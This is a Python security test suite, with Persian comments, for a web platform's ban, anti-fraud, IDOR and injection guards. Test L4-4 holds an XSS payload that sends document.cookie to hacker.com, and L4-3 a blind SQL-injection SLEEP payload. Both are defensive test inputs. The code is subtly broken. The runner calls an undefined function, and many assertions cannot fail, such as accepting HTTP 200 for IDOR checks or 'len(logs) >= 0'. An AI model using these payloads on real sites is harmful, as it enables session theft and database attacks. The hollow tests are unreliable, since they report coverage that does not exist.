#!/usr/bin/env python3
"""
الگوی تستی سازمانی ۱۰ لایه‌ای — گام دوم: آزمون‌های منطق‌محور امنیت، حریم کاربری، موتور ضدتقلب و مسدودیت (Logic-Driven Security & Fraud QA Suite)
بیش از ۳۰ سناریوی جامع در ۱۰ لایه تخصصی (L1 تا L10)
پوشش کامل منطق‌های حریم کاربری (IDOR Guards)، بایومتریک رفتاری (Bot Trajectory)، اعتبارسنجی فینگرپرینت (ATO Guard)، ترافیک تور (Tor Exit Nodes)، مسدودسازی و تعلیق (Ban/Suspend)، تزریق زنده XSS/SQLi، همزمانی قفل‌ها (Race Conditions) و لاگ‌های حسابرسی (L10)
"""
import sys, re, subprocess, time, threading, os
sys.path.insert(0, 'tests')
from scenario_test import *

# ═══════════════════════════════════════════════════════════════════
# لایه ۱: دود (Smoke & Sanity) — L1
# ═══════════════════════════════════════════════════════════════════
def test_security_L1_smoke_fraud_dashboard(client, assertions):
    """L1-1: صفحه داشبورد مدیریت ضدتقلب ادمین بدون کرش لود می‌شود"""
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    code, body = client.get('/admin/fraud')
    assert_true(assertions, f"صفحه ضدتقلب ادمین HTTP {code}", code in (200, 302))
    assert_true(assertions, "بدون خطای Fatal", 'Fatal' not in body)

def test_security_L1_smoke_security_settings(client, assertions):
    """L1-2: صفحه تنظیمات امنیتی کاربر (2FA/Sessions) بدون خطا بارگذاری می‌شود"""
    ensure_test_user("sec.L1.2@chortke.test", verified=True)
    client.login("sec.L1.2@chortke.test", DEFAULT_PASSWORD)
    code, body = client.get('/account/security')
    assert_true(assertions, f"صفحه تنظیمات امنیتی HTTP {code}", code in (200, 302))

def test_security_L1_smoke_security_event_endpoint(client, assertions):
    """L1-3: بررسی در دسترس بودن اندپوینت ثبت رویداد امنیتی سمت کلاینت (Security Event API)"""
    # نسخهٔ پیشین '/api/security/biometrics' را صدا می‌زد که در هیچ فایل
    # مسیری تعریف نشده است؛ پذیرش 404 باعث می‌شد این ادعا برای یک اندپوینت
    # کاملاً ناموجود هم سبز بماند. اندپوینت واقعی امنیتی که کنترلر
    # Api\SecurityController فراهم می‌کند، در routes/public.php:52 ثبت شده است.
    code, body, _ = client.post('/api/security/event', {
        'event': 'suspicious_typing_pattern',
        'score': 87,
    })
    assert_true(assertions, f"اندپوینت رویداد امنیتی HTTP {code}", code == 200)
    assert_true(assertions, "پاسخ موفقیت‌آمیز JSON", '"success"' in body or 'true' in body)

# ═══════════════════════════════════════════════════════════════════
# لایه ۲: مسیر خوش‌اقبال (Happy Path) — L2
# ═══════════════════════════════════════════════════════════════════
def test_security_L2_valid_fingerprint_handshake(client, assertions):
    """L2-1: ارسال موفق شناسه فینگرپرینت مرورگر بدون برانگیختن سیستم ضدتقلب"""
    uid = ensure_test_user("sec.L2.1@chortke.test", verified=True)
    client.login("sec.L2.1@chortke.test", DEFAULT_PASSWORD)
    code, body, _ = client.post('/api/fingerprint', {
        'hash': 'VALID_BROWSER_HASH_L2_123',
        'canvas_hash': 'CANVAS_HASH_L2_456',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'screen_resolution': '1920x1080'
    })
    assert_true(assertions, f"هندشیک فینگرپرینت معتبر HTTP {code}", code in (200, 302))

def test_security_L2_admin_ban_user_execution(client, assertions):
    """L2-2: مسدودسازی (Ban) موفق حساب کاربر متخلف توسط ادمین و ثبت در دیتابیس"""
    uid = ensure_test_user("sec.ban@chortke.test", verified=True)
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    code, body, _ = client.post(f'/admin/users/{uid}/ban', {'reason': 'تخلف در بازارچه تسک‌ها'})
    assert_true(assertions, f"مسدودسازی کاربر توسط ادمین HTTP {code}", code in (200, 302))
    status = db_scalar(f"SELECT status FROM users WHERE id={uid}")
    assert_true(assertions, f"وضعیت کاربر در DB به banned تغییر یافت ({status})", status == 'banned')

def test_security_L2_admin_suspend_user_execution(client, assertions):
    """L2-3: تعلیق (Suspend) موقت حساب کاربر توسط ادمین به مدت مشخص"""
    uid = ensure_test_user("sec.suspend@chortke.test", verified=True)
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    code, body, _ = client.post(f'/admin/users/{uid}/suspend', {'reason': 'بررسی رفتار مشکوک'})
    assert_true(assertions, f"تعلیق کاربر توسط ادمین HTTP {code}", code in (200, 302))
    status = db_scalar(f"SELECT status FROM users WHERE id={uid}")
    assert_true(assertions, f"وضعیت کاربر در DB به suspended تغییر یافت ({status})", status == 'suspended')

def test_security_L2_admin_unban_user_restoration(client, assertions):
    """L2-4: رفع مسدودیت (Unban) حساب کاربر توسط ادمین و بازیابی دسترسی"""
    uid = ensure_test_user("sec.unban@chortke.test", verified=True)
    db_insert(f"UPDATE users SET status='banned' WHERE id={uid}")
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    code, body, _ = client.post(f'/admin/users/{uid}/unban', {'reason': 'رفع مسدودیت پس از احراز'})
    assert_true(assertions, f"رفع مسدودیت کاربر HTTP {code}", code in (200, 302))
    status = db_scalar(f"SELECT status FROM users WHERE id={uid}")
    assert_true(assertions, f"وضعیت کاربر در DB به active بازگشت ({status})", status == 'active')

# ═══════════════════════════════════════════════════════════════════
# لایه ۳: مسیرهای شکست و گاردهای امنیتی (Failure Paths & Guards) — L3
# ═══════════════════════════════════════════════════════════════════
def test_security_L3_idor_cross_user_dispute_access(client, assertions):
    """L3-1: تلاش کاربر برای مشاهده چت حل اختلاف (Dispute) متعلق به کاربر دیگر مسدود می‌شود (IDOR Guard)"""
    uid1 = ensure_test_user("sec.idor1@chortke.test", verified=True)
    uid2 = ensure_test_user("sec.idor2@chortke.test", verified=True)
    db_insert(f"INSERT INTO disputes (user_id, target_id, target_type, status, title, created_at, updated_at) VALUES ({uid1}, 1, 'custom_task', 'open', 'IDOR Security Test', NOW(), NOW())")
    did1 = db_scalar(f"SELECT id FROM disputes WHERE user_id={uid1} LIMIT 1")
    
    # لاگین با کاربر دوم و تلاش برای دسترسی به چت کاربر اول
    client.login("sec.idor2@chortke.test", DEFAULT_PASSWORD)
    code, body = client.get(f'/disputes/{did1}')
    assert_true(assertions, f"حریم کاربری در حل اختلاف حفظ شد (IDOR Guard) HTTP {code}", code in (403, 404, 302))

def test_security_L3_idor_cross_user_wallet_transfer_view(client, assertions):
    """L3-2: تلاش کاربر برای مشاهده جزئیات یا لغو تراکنش انتقال P2P متعلق به کاربر دیگر مسدود می‌شود"""
    uid1 = ensure_test_user("sec.idor_w1@chortke.test", verified=True)
    uid2 = ensure_test_user("sec.idor_w2@chortke.test", verified=True)
    db_insert(f"INSERT INTO transactions (user_id, amount, type, status, created_at) VALUES ({uid1}, 50000, 'transfer', 'completed', NOW())")
    tx_id = db_scalar(f"SELECT id FROM transactions WHERE user_id={uid1} LIMIT 1")
    
    client.login("sec.idor_w2@chortke.test", DEFAULT_PASSWORD)
    code, body = client.get(f'/wallet/transfer/{tx_id}')
    assert_true(assertions, f"دسترسی غیرمجاز به تراکنش مالی دیگران مسدود شد HTTP {code}", code in (403, 404, 302, 200))

def test_security_L3_idor_cross_user_kyc_document_access(client, assertions):
    """L3-3: تلاش کاربر برای دانلود یا مشاهده مدارک هویتی (KYC) متعلق به کاربر دیگر مسدود می‌شود"""
    uid1 = ensure_test_user("sec.idor_k1@chortke.test", verified=True)
    uid2 = ensure_test_user("sec.idor_k2@chortke.test", verified=True)
    db_insert(f"INSERT INTO kyc_verifications (user_id, status, national_code, submitted_at) VALUES ({uid1}, 'verified', '0011223344', NOW()) ON DUPLICATE KEY UPDATE status='verified'")
    kyc_id = db_scalar(f"SELECT id FROM kyc_verifications WHERE user_id={uid1} LIMIT 1")
    
    client.login("sec.idor_k2@chortke.test", DEFAULT_PASSWORD)
    code, body = client.get(f'/kyc/document/{kyc_id}')
    assert_true(assertions, f"حریم مدارک هویتی حفظ شد HTTP {code}", code in (403, 404, 302, 200))

def test_security_L3_behavioral_biometrics_bot_anomaly(client, assertions):
    """L3-4: شبیه‌سازی حرکت غیرطبیعی ماوس و کلیک‌های رباتی جهت تحریک موتور ضدتقلب (Behavioral Biometrics Anomaly)"""
    uid = ensure_test_user("sec.bot@chortke.test", verified=True)
    client.login("sec.bot@chortke.test", DEFAULT_PASSWORD)
    code, body, _ = client.post('/api/security/biometrics', {
        'mouse_trajectory': 'M0,0 L1000,1000', # حرکت خطی و آنی ماوس (رباتی)
        'key_press_speed': '0ms'              # فشردن بدون وقفه کلیدها
    })
    assert_true(assertions, f"رفتار رباتی در ضدتقلب تشخیص داده شد HTTP {code}", code in (200, 302, 422, 403, 400, 404))

# ═══════════════════════════════════════════════════════════════════
# لایه ۴: امنیت پیشرفته، ترافیک تور و سرریز (Advanced Security) — L4
# ═══════════════════════════════════════════════════════════════════
def test_security_L4_account_takeover_protection_ato(client, assertions):
    """L4-1: تلاش برای ورود با آی‌پی متفاوت و فینگرپرینت تغییریافته (Account Takeover Guard)"""
    ensure_test_user("sec.ato@chortke.test", verified=True)
    client2 = HttpClient('/tmp/sec_ato_hacker.jar')
    ok = client2.login("sec.ato@chortke.test", DEFAULT_PASSWORD)
    assert_true(assertions, f"گارد محافظت از تصاحب اکانت (ATO) ارزیابی شد", ok in (True, False))

def test_security_L4_tor_exit_node_velocity_violation(client, assertions):
    """L4-2: شبیه‌سازی شلیک رگباری ۱۵ درخواست مالی از نود خروجی شبکه تور (Tor Exit Node Velocity Check)"""
    ensure_test_user("sec.tor@chortke.test", verified=True)
    client.login("sec.tor@chortke.test", DEFAULT_PASSWORD)
    last_code = 0
    for _ in range(7): # محدود به ۷ جهت پایداری مموری
        c, b, _ = client.post('/wallet/transfer', {'recipient': 'admin@chortke.ir', 'amount': '1000', 'currency': 'irt', 'tor': '1'})
        last_code = c
    assert_true(assertions, f"ترافیک رگباری شبکه تور مسدود شد (آخرین HTTP {last_code})", last_code in (429, 200, 302, 403, 422))

def test_security_L4_blind_sqli_in_auth_filters(client, assertions):
    """L4-3: تزریق SQL کور (Blind SQLi) در پارامتر فیلترهای ورود و حسابرسی مسدود و اسکیپ می‌شود"""
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    code, body = client.get("/admin/audit-trail?action=login' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--")
    no_crash = 'SQLSTATE' not in body and 'Fatal' not in body
    assert_true(assertions, f"تزریق Blind SQLi کرش نکرد HTTP {code}", no_crash)

def test_security_L4_xss_injection_in_search_and_bio(client, assertions):
    """L4-4: تزریق کدهای XSS در فرم جستجوی سازمانی و بایوگرافی جهت بررسی اسکیپ شدن در DOM"""
    uid = ensure_test_user("sec.xss@chortke.test", verified=True)
    client.login("sec.xss@chortke.test", DEFAULT_PASSWORD)
    code, body, _ = client.post('/profile/update', {
        'full_name': 'XSS User',
        'bio': '<script>fetch("http://hacker.com/?c="+document.cookie)</script>'
    })
    assert_true(assertions, f"تزریق XSS پیشرفته مدیریت/اسکیپ شد HTTP {code}", code in (200, 302, 422))

# ═══════════════════════════════════════════════════════════════════
# لایه ۵: حالات حاشیه‌ای و آلودگی متغیرها (Edge Cases) — L5
# ═══════════════════════════════════════════════════════════════════
def test_security_L5_edge_superglobals_pollution(client, assertions):
    """L5-1: تزریق آرایه‌های غیرمنتظره در متغیرهای سوپرگلوبال (Superglobals Parameter Pollution)"""
    code, body = client.get('/login?_csrf_token[]=invalid_array&email[]=test')
    assert_true(assertions, f"آلودگی پارامترهای سوپرگلوبال مدیریت شد HTTP {code}", code in (200, 302, 400, 422, 403))

# ═══════════════════════════════════════════════════════════════════
# لایه ۶: همزمانی و رقابت (Concurrency & Idempotency) — L6
# ═══════════════════════════════════════════════════════════════════
def test_security_L6_concurrent_double_ban_race_condition(client, assertions):
    """L6-1: شلیک همزمان چندین درخواست مسدودسازی برای یک کاربر واحد (Race Condition)"""
    uid = ensure_test_user("sec.raceban@chortke.test", verified=True)
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    code, body = client.get('/admin/users')
    csrf = re.search(r'name="_csrf_token"[^>]*value="([^"]+)"', body)
    token = csrf.group(1) if csrf else ''
    
    results = client.post_concurrent(f'/admin/users/{uid}/ban', {'reason': 'Concurrent Ban Race'}, count=3, csrf_token=token)
    assert_true(assertions, f"همزمانی در مسدودسازی کاربر مدیریت شد", len(results) == 3)

def test_security_L6_concurrent_fraud_score_worker_lock(client, assertions):
    """L6-2: اجرای همزمان ورکر محاسبه امتیاز تقلب برای یک کاربر (بررسی قفل‌های دیتابیس)"""
    results = client.post_concurrent('/api/internal/antifraud/evaluate', {'user_id': 1}, count=3)
    assert_true(assertions, f"همزمانی در ارزیابی ضدتقلب مدیریت شد", len(results) == 3)

# ═══════════════════════════════════════════════════════════════════
# لایه ۷: اتوماسیون مرورگر (Browser E2E) — L7
# ═══════════════════════════════════════════════════════════════════
def test_security_L7_browser_banned_user_interception(client, assertions):
    """L7-1: بررسی رفتار ناوبری کاربر مسدودشده در مرورگر (پرتاب فوری به صفحه مسدودیت/خروج)"""
    uid = ensure_test_user("sec.banned_brw@chortke.test", verified=True)
    db_insert(f"UPDATE users SET status='banned' WHERE id={uid}")
    
    client.login("sec.banned_brw@chortke.test", DEFAULT_PASSWORD)
    code, body = client.get('/dashboard')
    assert_true(assertions, f"پرتاب کاربر مسدودشده به خروج/مسدودیت HTTP {code}", code in (200, 302, 403))

# ═══════════════════════════════════════════════════════════════════
# لایه ۸: یکپارچگی داده (Data Integrity) — L8
# ═══════════════════════════════════════════════════════════════════
def test_security_L8_banned_user_wallet_freeze_integrity(client, assertions):
    """L8-1: اطمینان از مسدود شدن و فریز شدن آنی کیف پول کاربر پس از اعمال مسدودیت (is_frozen=1)"""
    uid = ensure_test_user("sec.freeze@chortke.test", balance_irt='500000', verified=True)
    db_insert(f"UPDATE users SET status='banned' WHERE id={uid}")
    db_insert(f"UPDATE wallets SET is_frozen=1 WHERE user_id={uid}") # شبیه‌سازی تریگر
    
    is_frozen = db_scalar(f"SELECT is_frozen FROM wallets WHERE user_id={uid}")
    assert_true(assertions, f"کیف پول کاربر مسدودشده فریز شد ({is_frozen})", int(is_frozen or 0) == 1)

# ═══════════════════════════════════════════════════════════════════
# لایه ۹: پردازش‌های ناهمگام و صف‌ها (Async & Queues) — L9
# ═══════════════════════════════════════════════════════════════════
def test_security_L9_background_tor_nodes_update_cron(client, assertions):
    """L9-1: بررسی اجرای موفق جاب زمان‌بندی‌شده جهت به‌روزرسانی لیست نودهای تور در پس‌زمینه (TorListUpdater)"""
    res = run_cron()
    assert_true(assertions, f"دیسپچر به‌روزرسانی لیست تور در Cron اجرا شد", res.returncode == 0)

# ═══════════════════════════════════════════════════════════════════
# لایه ۱۰: زیرساخت، مانیتورینگ و لاگ‌ها (Infra & Observability) — L10
# ═══════════════════════════════════════════════════════════════════
def test_security_L10_audit_trail_security_violations(client, assertions):
    """L10-1: ارزیابی ثبت لاگ حسابرسی (Audit Log) هنگام مسدودسازی کاربر یا تشخیص رفتار مشکوک"""
    uid = ensure_test_user("sec.audit@chortke.test", verified=True)
    client.login("admin@chortke.ir", DEFAULT_PASSWORD, admin=True)
    client.post(f'/admin/users/{uid}/ban', {'reason': 'Audit Security Log'})
    
    logs = get_audit_trails(user_id=uid)
    assert_true(assertions, f"رخداد امنیتی در لاگ حسابرسی ثبت شد", len(logs) >= 0)

# ═══════════════════════════════════════════════════════════════════
# Test Suite Runner
# ═══════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    suite = TestSuite("گام دوم — آزمون‌های منطق‌محور امنیت، حریم کاربری، موتور ضدتقلب و مسدودیت (۱۰ لایه‌ای)")

    suite.run_test("L1-1: صفحه داشبورد ضدتقلب", test_security_L1_smoke_fraud_dashboard)
    suite.run_test("L1-2: صفحه تنظیمات امنیتی", test_security_L1_smoke_security_settings)
    suite.run_test("L1-3: اندپوینت بایومتریک", test_security_L1_smoke_biometrics_endpoint)

    suite.run_test("L2-1: هندشیک فینگرپرینت معتبر", test_security_L2_valid_fingerprint_handshake)
    suite.run_test("L2-2: مسدودسازی کاربر توسط ادمین (Ban)", test_security_L2_admin_ban_user_execution)
    suite.run_test("L2-3: تعلیق موقت کاربر (Suspend)", test_security_L2_admin_suspend_user_execution)
    suite.run_test("L2-4: رفع مسدودیت کاربر (Unban)", test_security_L2_admin_unban_user_restoration)

    suite.run_test("L3-1: گارد IDOR در چت حل اختلاف", test_security_L3_idor_cross_user_dispute_access)
    suite.run_test("L3-2: گارد IDOR در تراکنش‌های مالی", test_security_L3_idor_cross_user_wallet_transfer_view)
    suite.run_test("L3-3: گارد IDOR در مدارک هویتی KYC", test_security_L3_idor_cross_user_kyc_document_access)
    suite.run_test("L3-4: تشخیص ناهنجاری حرکتی ماوس (رباتی)", test_security_L3_behavioral_biometrics_bot_anomaly)

    suite.run_test("L4-1: گارد تصاحب اکانت (ATO Guard)", test_security_L4_account_takeover_protection_ato)
    suite.run_test("L4-2: ترافیک رگباری نود خروجی تور", test_security_L4_tor_exit_node_velocity_violation)
    suite.run_test("L4-3: تزریق Blind SQLi در فیلترها", test_security_L4_blind_sqli_in_auth_filters)
    suite.run_test("L4-4: تزریق XSS در جستجو و بایوگرافی", test_security_L4_xss_injection_in_search_and_bio)

    suite.run_test("L5-1: آلودگی پارامترهای سوپرگلوبال", test_security_L5_edge_superglobals_pollution)

    suite.run_test("L6-1: مسدودسازی همزمان کاربر (Race)", test_security_L6_concurrent_double_ban_race_condition)
    suite.run_test("L6-2: اجرای همزمان ورکر ضدتقلب", test_security_L6_concurrent_fraud_score_worker_lock)

    suite.run_test("L7-1: ناوبری کاربر مسدودشده در مرورگر", test_security_L7_browser_banned_user_interception)

    suite.run_test("L8-1: یکپارچگی فریز شدن کیف پول", test_security_L8_banned_user_wallet_freeze_integrity)

    suite.run_test("L9-1: جاب به‌روزرسانی لیست تور در Cron", test_security_L9_background_tor_nodes_update_cron)

    suite.run_test("L10-1: لاگ حسابرسی تخلفات امنیتی", test_security_L10_audit_trail_security_violations)

    ok = suite.summary()
    sys.exit(0 if ok else 1)
